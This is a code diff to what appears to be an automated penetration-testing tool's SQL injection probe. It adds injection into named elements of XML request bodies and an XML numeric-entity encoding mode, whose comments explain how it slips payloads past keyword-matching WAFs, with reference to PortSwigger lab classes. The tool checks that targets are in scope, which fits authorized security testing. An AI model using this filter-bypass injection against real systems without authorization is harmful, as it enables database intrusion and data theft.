@@ -34,9 +34,10 @@ logger = get_logger(__name__)
 
 _VALID_SEVERITIES = ("critical", "high", "medium", "low", "info")
 # "cookie" widens the set for the conditional-responses class of labs where the injectable
-# param is a cookie (e.g. TrackingId), not a query/body field. Existing locations are kept
-# in place and order — new entries only append.
-_LOCATIONS = ("graphql_var", "query", "body", "cookie")
+# param is a cookie (e.g. TrackingId), not a query/body field. "xml_body" injects into a named
+# element of an XML request body (e.g. a POST /product/stock stockCheck document). Existing
+# locations are kept in place and order — new entries only append.
+_LOCATIONS = ("graphql_var", "query", "body", "cookie", "xml_body")
 
 
 def _error_re() -> "re.Pattern":
@@ -210,13 +211,27 @@ _SCHEMA: Dict[str, Any] = {
                             "input object, use a dotted path relative to variables, e.g. "
                             "'v.contentTitle' for variables.v.contentTitle."},
         "injection_location": {"type": "string", "description": "Where the parameter lives: "
-                               "'graphql_var' (a GraphQL variable), 'query' (URL query string), or "
-                               "'body' (JSON/form body). Default 'graphql_var'."},
+                               "'graphql_var' (a GraphQL variable), 'query' (URL query string), "
+                               "'body' (JSON/form body), 'cookie' (a named cookie), or 'xml_body' "
+                               "(replace the text of a named element in the XML document passed as "
+                               "'xml_body'; injection_point is the element name, e.g. 'storeId'). "
+                               "Default 'graphql_var'."},
         "body": {"type": "string", "description": "Request body template. For graphql_var a JSON "
                  "{query, variables, operationName}. If omitted for graphql_var, the most recent "
                  "captured operation for this URL is used."},
-        "content_type": {"type": "string", "description": "Content-Type for the request (default "
-                         "application/json)."},
+        "xml_body": {"type": "string", "description": "xml_body location only: the base XML document "
+                     "to inject into, e.g. '<?xml version=\"1.0\"?><stockCheck><productId>1"
+                     "</productId><storeId>1</storeId></stockCheck>'. injection_point names the "
+                     "element whose text content is replaced with the payload. Required when "
+                     "injection_location='xml_body'."},
+        "content_type": {"type": "string", "description": "Content-Type for the request. Default "
+                         "application/json, or 'text/plain; charset=utf-8' for xml_body."},
+        "encode": {"type": "string", "enum": ["", "xml_entities"], "description": "Optional payload "
+                   "encoding for WAF/filter bypass. '' (default) sends the payload as-is. "
+                   "'xml_entities' rewrites every payload character to its XML hex numeric character "
+                   "reference (UNION -> &#x55;&#x4e;&#x49;&#x4f;&#x4e;): a WAF string-matching raw "
+                   "SQL keywords does not fire, but the server XML-decodes the entities before the "
+                   "value reaches the SQL. Pair with injection_location='xml_body'."},
         "record": {"type": "boolean", "description": "Record a finding when CONFIRMED (default true)."},
         "title": {"type": "string", "description": "Finding title (optional; a sensible default is used)."},
         "severity": {"type": "string", "description": "critical|high|medium|low|info. If omitted, "
@@ -283,6 +298,31 @@ _SCHEMA: Dict[str, Any] = {
     },
     "required": ["url", "injection_point"],
 }
+
+
+def _encode_payload(value: str, mode: str) -> str:
+    """Transform an injected payload value for WAF / input-filter bypass before it is placed into
+    the request. ``mode`` == '' (default) returns the value unchanged — no behavior change anywhere.
+    ``mode`` == 'xml_entities' rewrites every character ``c`` to its XML hex numeric character
+    reference ``&#x{ord(c):x};``. A WAF that string-matches raw SQL keywords in the body does not
+    fire on the encoded form, but the server's XML parser decodes the entities back to the literal
+    characters before the value reaches the SQL — so the payload executes while the filter is
+    bypassed (the PortSwigger "filter bypass via XML encoding" class)."""
+    if mode == "xml_entities":
+        return "".join(f"&#x{ord(c):x};" for c in value)
+    return value
+
+
+def _inject_xml_element(xml: str, element: str, value: str) -> Optional[str]:
+    """Replace the TEXT CONTENT of the FIRST ``<element>...</element>`` in ``xml`` with ``value``,
+    leaving the element tags (and the rest of the document) intact. Returns the new XML string, or
+    ``None`` if the element is not present. A function replacement is used so backslashes or
+    ``\\1``-style sequences in the payload are inserted literally (str.sub template escaping would
+    otherwise corrupt them)."""
+    pat = re.compile(rf"(<{re.escape(element)}>)(.*?)(</{re.escape(element)}>)", re.DOTALL)
+    if not pat.search(xml):
+        return None
+    return pat.sub(lambda m: m.group(1) + value + m.group(3), xml, count=1)
 
 
 async def _resolve_auth(ctx: ToolContext, url: str, method: str) -> Dict[str, Any]:
@@ -359,11 +399,23 @@ async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
     point = str(args.get("injection_point", "")).strip()
     location = str(args.get("injection_location", "graphql_var")).strip().lower() or "graphql_var"
     method = str(args.get("method", "POST")).strip().upper() or "POST"
-    content_type = str(args.get("content_type", "application/json")).strip() or "application/json"
+    # xml_body posts a raw XML document — default its Content-Type to text/plain (the lab/WAF path
+    # that smuggles SQL via XML entity encoding), while every other location keeps application/json.
+    _ct_default = "text/plain; charset=utf-8" if location == "xml_body" else "application/json"
+    content_type = str(args.get("content_type", _ct_default)).strip() or _ct_default
+    encode = str(args.get("encode", "")).strip().lower()
+    xml_body_tmpl = str(args.get("xml_body", ""))
     if not url or not point:
         return {"ok": False, "error": "url and injection_point are required"}
     if location not in _LOCATIONS:
         return {"ok": False, "error": f"injection_location must be one of {_LOCATIONS}"}
+    if location == "xml_body":
+        if not xml_body_tmpl.strip():
+            return {"ok": False, "error": "injection_location 'xml_body' requires an 'xml_body' "
+                    "template (the base XML document to inject into)"}
+        if not re.search(rf"<{re.escape(point)}>.*?</{re.escape(point)}>", xml_body_tmpl, re.DOTALL):
+            return {"ok": False, "error": f"injection_point element '{point}' is not present in the "
+                    "xml_body template — expected <{point}>...</{point}>".replace("{point}", point)}
     if not ctx.is_in_scope(url):
         return {"ok": False, "error": "url is out of scope", "url": url}
 
@@ -409,6 +461,19 @@ async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
     async def _send_value(client: "httpx.AsyncClient", value: str) -> Optional["httpx.Response"]:
         """Inject ``value`` at the chosen point and send through the proxy. Returns the response."""
         try:
+            # Optional payload encoding (WAF/input-filter bypass) — applied to the injected value
+            # for ANY location; default encode="" is a no-op, so existing behavior is unchanged.
+            value = _encode_payload(value, encode)
+            if location == "xml_body":
+                # Replace the text content of the named XML element with the (optionally encoded)
+                # payload and POST the raw document. Presence of both xml_body and the element was
+                # validated up front; a None here (element vanished) is a defensive no-send.
+                body = _inject_xml_element(xml_body_tmpl, point, value)
+                if body is None:
+                    logger.debug("sqli_probe: xml element not found at send", element=point)
+                    return None
+                return await client.request(method, url, headers=_headers(),
+                                            content=body.encode("utf-8"))
             if location == "graphql_var":
                 # Dotted injection_point (e.g. v.contentTitle) targets a NESTED input field; a
                 # plain name is a top-level variable (reuse the shared helper).
@@ -1037,7 +1102,10 @@ register(Tool(
         "'blind_time' (time oracle), 'error_visible' (one-shot error-message leak), or 'oast' "
         "(out-of-band callback) to deterministically extract data char-by-char — far more reliable "
         "than hand-driving the binary search via send_request. Also supports a 'cookie' "
-        "injection_location for injectable-cookie labs. Default mode is the in-band probe."
+        "injection_location for injectable-cookie labs, and an 'xml_body' location that injects "
+        "into a named element of an XML request body. Set encode='xml_entities' to smuggle the "
+        "payload past a keyword-matching WAF via XML numeric-character-reference encoding (the "
+        "server XML-decodes before the SQL runs). Default mode is the in-band probe."
     ),
     input_schema=_SCHEMA,
     handler=_sqli_probe,
